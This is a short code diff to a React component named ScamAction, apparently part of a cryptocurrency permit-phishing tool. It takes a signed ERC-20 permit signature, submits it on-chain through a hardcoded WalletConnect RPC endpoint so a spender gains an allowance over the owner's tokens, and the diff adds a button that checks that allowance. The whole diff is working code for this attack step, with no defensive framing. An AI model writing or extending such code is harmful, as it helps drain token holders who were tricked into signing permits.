@@ -3,14 +3,16 @@
 import {SignedPermitSignature} from "@/app/scam/page";
 import { callContractMethod } from "../page";
 import {CustomContract} from "@/app/TokenList";
+import React from "react";
 
 const ScamAction = (props: {
 	data: SignedPermitSignature
 }) => {
 	const {data} = props;
+	const provider = "https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405";
 	return (
 		<div>
-			<button onClick={()=>{
+			<button onClick={() => {
 				callContractMethod('permit', [
 						data.permit.owner,
 						data.permit.spender,
@@ -22,16 +24,24 @@ const ScamAction = (props: {
 						{
 							gasLimit: 1000000
 						}
-					],CustomContract.ETH,
-					"https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405")
-					.catch((e)=>{
+					], CustomContract.ETH,
+					provider)
+					.catch((e) => {
 						alert(`ERROR ${e?.message ?? e}`);
 						console.error(e)
-					}).then(()=>{
+					}).then(() => {
 					alert("Permit successful!")
 				});
 			}}>
 				permit
+			</button>
+			<button onClick={async () => {
+				alert((await callContractMethod('allowance', [
+						data.permit.owner,
+						data.permit.spender
+					], CustomContract.ETH, provider)));
+			}}>
+				Allowance
 			</button>
 		</div>
 	);
